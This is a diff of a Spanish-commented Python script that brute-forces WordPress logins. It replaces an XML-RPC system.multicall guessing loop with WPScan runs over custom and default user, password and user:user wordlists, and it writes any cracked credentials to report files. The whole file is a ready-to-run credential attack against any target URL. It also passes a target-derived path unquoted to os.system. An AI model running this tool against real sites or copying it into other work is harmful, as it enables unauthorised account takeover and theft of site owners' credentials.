@@ -1,113 +1,71 @@
 import os
 import sys
-import time
-import xmlrpc.client
+import subprocess
+import tempfile
+import re
 
-def ejecutar_bruteforce_multicall(xmlrpc_url, credenciales, batch_size, output_dir, success_file, debug=False):
+def run_wpscan_attack_file(target, usernames_file, passwords_file, success_file):
     """
-    Ejecuta el ataque en batches usando xmlrpc.client.MultiCall.
-    Retorna True si se encuentra alguna credencial válida; de lo contrario, False.
-    Se agregó la opción debug para imprimir información extra sobre cada resultado.
+    Ejecuta WPScan utilizando archivos de usuarios y contraseñas y reporta todas las credenciales
+    válidas encontradas (según la salida, que debe contener líneas con el formato:
+    [SUCCESS] - usuario / contraseña).
     """
-    server = xmlrpc.client.ServerProxy(xmlrpc_url)
-    batch_calls = []
-    call_details = []
-    procesadas = 0
-    total_combinaciones = len(credenciales)
+    command = [
+        "wpscan",
+        "--url", target,
+        "--usernames", usernames_file,
+        "--passwords", passwords_file,
+        "--no-banner"
+    ]
+    print(f"[*] Ejecutando WPScan: {' '.join(command)}")
+    result = subprocess.run(command, capture_output=True, text=True)
+    output = result.stdout + "\n" + result.stderr
 
-    for (usuario, contrasena) in credenciales:
-        batch_calls.append((usuario, contrasena))
-        call_details.append((usuario, contrasena))
-        if len(batch_calls) == batch_size:
-            multicall = xmlrpc.client.MultiCall(server)
-            for (u, p) in batch_calls:
-                multicall.wp.getUsersBlogs(u, p)
-            try:
-                resultados = multicall()
-            except Exception as e:
-                print(f"[!] Error en multicall: {e}")
-                resultados = [None] * len(batch_calls)
-            # Iteramos por índice, atrapando cualquier Fault
-            for idx in range(len(batch_calls)):
-                try:
-                    resultado = resultados[idx]
-                except xmlrpc.client.Fault as fault:
-                    resultado = fault
-                u, p = call_details[idx]
-                if debug:
-                    print(f"DEBUG: Combinación {u}:{p} -> resultado: {resultado} (tipo: {type(resultado)})")
-                # Aquí comprobamos: si no es Fault, y es una lista (o tupla) con al menos un elemento, consideramos válidas las credenciales.
-                if not isinstance(resultado, xmlrpc.client.Fault) and isinstance(resultado, (list, tuple)) and len(resultado) > 0:
-                    print(f"[+] Credenciales válidas encontradas: {u}:{p}")
-                    with open(success_file, "a", encoding="utf-8") as sf:
-                        sf.write(f"{u}:{p}\n")
-                    return True
-            procesadas += len(batch_calls)
-            print(f"[*] Combinaciones procesadas: {procesadas}/{total_combinaciones}")
-            batch_calls = []
-            call_details = []
-            time.sleep(0.5)
+    # Buscar todas las ocurrencias de éxito en el formato: [SUCCESS] - usuario / contraseña
+    success_matches = re.findall(r'\[SUCCESS\]\s*-\s*(\S+)\s*/\s*(\S+)', output)
+    if success_matches:
+        for username, password in success_matches:
+            print(f"[+] Credenciales válidas encontradas: {username}:{password}")
+            with open(success_file, "a", encoding="utf-8") as sf:
+                sf.write(f"Credenciales válidas encontradas en Wordpress: {username}:{password}\n")
+        return len(success_matches)
+    else:
+        print("[-] WPScan: No se encontraron credenciales válidas en este intento.")
+        return 0
 
-    if batch_calls:
-        multicall = xmlrpc.client.MultiCall(server)
-        for (u, p) in batch_calls:
-            multicall.wp.getUsersBlogs(u, p)
-        try:
-            resultados = multicall()
-        except Exception as e:
-            print(f"[!] Error en multicall: {e}")
-            resultados = [None] * len(batch_calls)
-        for idx in range(len(batch_calls)):
-            try:
-                resultado = resultados[idx]
-            except xmlrpc.client.Fault as fault:
-                resultado = fault
-            u, p = call_details[idx]
-            if debug:
-                print(f"DEBUG: Combinación {u}:{p} -> resultado: {resultado} (tipo: {type(resultado)})")
-            if not isinstance(resultado, xmlrpc.client.Fault) and isinstance(resultado, (list, tuple)) and len(resultado) > 0:
-                print(f"[+] Credenciales válidas encontradas: {u}:{p}")
-                with open(success_file, "a", encoding="utf-8") as sf:
-                    sf.write(f"{u}:{p}\n")
-                return True
-        procesadas += len(batch_calls)
-        print(f"[*] Combinaciones procesadas: {procesadas}/{total_combinaciones}")
-
-    return False
-
-
-def run_wordpress_bruteforce(target, batch_size=10, debug=False):
+def run_wordpress_bruteforce(target):
     """
-    Realiza fuerza bruta contra el endpoint XML-RPC de WordPress usando system.multicall.
-
-    Flujo:
-      1. Si existe la carpeta wordlists/<target_clean>/ y se encuentran:
-         - Ambos archivos (users.txt y passwords.txt): se prueban todas las combinaciones.
-         - Solo users.txt: se carga la lista por defecto de contraseñas (top_wordpress_passwords.txt) y se prueban las combinaciones.
-         Además, se intenta el escenario user:user para cada usuario.
-      2. Independientemente de lo anterior, se prueba la lista combinada de credenciales desde
-         wordlists/misc/common_credentials.txt (formato usuario:contraseña).
-
-    Se detiene en cuanto se encuentran credenciales válidas.
+    Realiza fuerza bruta contra un sitio WordPress usando WPScan y las wordlists disponibles.
+    Se ejecutan todas las casuísticas:
+      1. Si existe la carpeta wordlists/<target_clean>/:
+         - Si se encuentran ambos archivos (users.txt y passwords.txt), se usan esos.
+         - Si solo existe users.txt, se utiliza la lista por defecto de contraseñas (top_wordpress_passwords.txt).
+         Además, se prueba el escenario usuario:usuario para cada usuario.
+      2. Se prueba la lista combinada de credenciales desde wordlists/misc/common_credentials.txt.
+    Se reportan todas las credenciales válidas encontradas.
     """
     # Asegurarse de que el target incluya el esquema
     if not target.startswith("http://") and not target.startswith("https://"):
         target = "http://" + target
     target_clean = target.replace("http://", "").replace("https://", "").rstrip("/")
-    xmlrpc_url = target.rstrip("/") + "/xmlrpc.php"
 
-    # Directorio para logs
+    # Directorio para guardar logs y resultados
     output_dir = os.path.join("logs", target_clean, "http", "http_wordpress_bruteforce")
     os.makedirs(output_dir, exist_ok=True)
     success_file = os.path.join(output_dir, "success.txt")
+    # Se limpia el archivo de éxitos previo (si existe)
+    with open(success_file, "w", encoding="utf-8") as sf:
+        sf.write("")
+
+    total_found = 0
 
     # --- 1. Intentar con listas personalizadas ---
     custom_dir = os.path.join("wordlists", target_clean)
     users_custom = []
     pass_custom = []
+    user_file = os.path.join(custom_dir, "users.txt")
+    pass_file = os.path.join(custom_dir, "passwords.txt")
     if os.path.isdir(custom_dir):
-        user_file = os.path.join(custom_dir, "users.txt")
-        pass_file = os.path.join(custom_dir, "passwords.txt")
         if os.path.isfile(user_file):
             try:
                 with open(user_file, "r", encoding="utf-8") as f:
@@ -125,14 +83,11 @@ def run_wordpress_bruteforce(target, batch_size=10, debug=False):
 
     if users_custom or pass_custom:
         print("[*] Intentando combinaciones personalizadas...")
-        # Caso 1: Usuarios y contraseñas personalizados
+        # Caso 1: Si existen ambos archivos personalizados
         if users_custom and pass_custom:
-            credenciales = [(u, p) for u in users_custom for p in pass_custom]
-            print(f"[*] Probando {len(credenciales)} combinaciones (usuarios personalizados x contraseñas personalizadas)...")
-            if ejecutar_bruteforce_multicall(xmlrpc_url, credenciales, batch_size, output_dir, success_file, debug):
-                return
-        # Caso 2: Solo usuarios personalizados (se usa lista por defecto de contraseñas)
-        elif users_custom and not pass_custom:
+            total_found += run_wpscan_attack_file(target, user_file, pass_file, success_file)
+        # Caso 2: Si solo existen usuarios personalizados (se usa la lista por defecto de contraseñas)
+        if users_custom:
             default_pass_file = os.path.join("wordlists", "misc", "top_wordpress_passwords.txt")
             if os.path.isfile(default_pass_file):
                 try:
@@ -146,17 +101,9 @@ def run_wordpress_bruteforce(target, batch_size=10, debug=False):
                 print(f"[!] No se encontró la lista por defecto {default_pass_file}")
                 default_passwords = []
             if default_passwords:
-                credenciales = [(u, p) for u in users_custom for p in default_passwords]
-                print(f"[*] Probando {len(credenciales)} combinaciones (usuarios personalizados x contraseñas por defecto)...")
-                if ejecutar_bruteforce_multicall(xmlrpc_url, credenciales, batch_size, output_dir, success_file, debug):
-                    return
+                total_found += run_wpscan_attack_file(target, user_file, default_pass_file, success_file)
         # Bloque adicional: Probar usuario:usuario
-        if users_custom:
-            credenciales = [(u, u) for u in users_custom]
-            print(f"[*] Probando {len(credenciales)} combinaciones (usuario:usuario)...")
-            if ejecutar_bruteforce_multicall(xmlrpc_url, credenciales, batch_size, output_dir, success_file, debug):
-                return
-        print("[-] No se encontraron credenciales válidas usando listas personalizadas.")
+            total_found += run_wpscan_attack_file(target, user_file, user_file, success_file)
 
     # --- 2. Intentar con lista combinada por defecto ---
     default_combo_file = os.path.join("wordlists", "misc", "common_credentials.txt")
@@ -169,26 +116,48 @@ def run_wordpress_bruteforce(target, batch_size=10, debug=False):
             print(f"[!] Error al leer {default_combo_file}: {e}")
             combos = []
         if combos:
-            credenciales = []
+            # Crear listas para usuarios y contraseñas a partir de los combos
+            usuarios = []
+            contrasenas = []
             for combo in combos:
                 if ":" in combo:
                     u, p = combo.split(":", 1)
-                    credenciales.append((u.strip(), p.strip()))
-            print(f"[*] Probando {len(credenciales)} combinaciones desde lista combinada...")
-            if ejecutar_bruteforce_multicall(xmlrpc_url, credenciales, batch_size, output_dir, success_file, debug):
-                return
+                    usuarios.append(u.strip())
+                    contrasenas.append(p.strip())
+
+            with tempfile.NamedTemporaryFile(mode="w", delete=False, encoding="utf-8") as tmp_users:
+                for user in usuarios:
+                    tmp_users.write(user + "\n")
+                tmp_users_file = tmp_users.name
+
+            with tempfile.NamedTemporaryFile(mode="w", delete=False, encoding="utf-8") as tmp_pass:
+                for pwd in contrasenas:
+                    tmp_pass.write(pwd + "\n")
+                tmp_pass_file = tmp_pass.name
+
+            print("[*] Probando combinaciones desde lista combinada utilizando archivos temporales...")
+            total_found += run_wpscan_attack_file(target, tmp_users_file, tmp_pass_file, success_file)
+
+            # Eliminar los archivos temporales
+            os.remove(tmp_users_file)
+            os.remove(tmp_pass_file)
         else:
             print("[!] La lista combinada está vacía.")
     else:
         print(f"[!] No se encontró la lista combinada de credenciales: {default_combo_file}")
 
-    print("[-] Bruteforce finalizado sin encontrar credenciales válidas.")
-
+    if total_found > 0:
+        print(f"[+] Bruteforce finalizado. Se encontraron un total de {total_found} credencial(es) válida(s).")
+        # Copiar el archivo de éxitos a la carpeta de logs/<target>/reporte/wordpress_credentials.txt
+        reporte_dir = os.path.join("logs", target_clean, "reporte")
+        os.makedirs(reporte_dir, exist_ok=True)
+        reporte_file = os.path.join(reporte_dir, "wordpress_credentials.txt")
+        os.system(f"cp {success_file} {reporte_file}")
+    else:
+        print("[-] Bruteforce finalizado sin encontrar credenciales válidas.")
+        with open(success_file, "w", encoding="utf-8") as sf:
+            sf.write("No se encontraron credenciales válidas en Wordpress.")
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Uso: python http_wordpress_bruteforce.py <target> [debug]")
-        sys.exit(1)
     target = sys.argv[1]
-    debug_flag = (len(sys.argv) >= 3 and sys.argv[2].lower() == "debug")
-    run_wordpress_bruteforce(target, batch_size=10, debug=debug_flag)
+    run_wordpress_bruteforce(target)
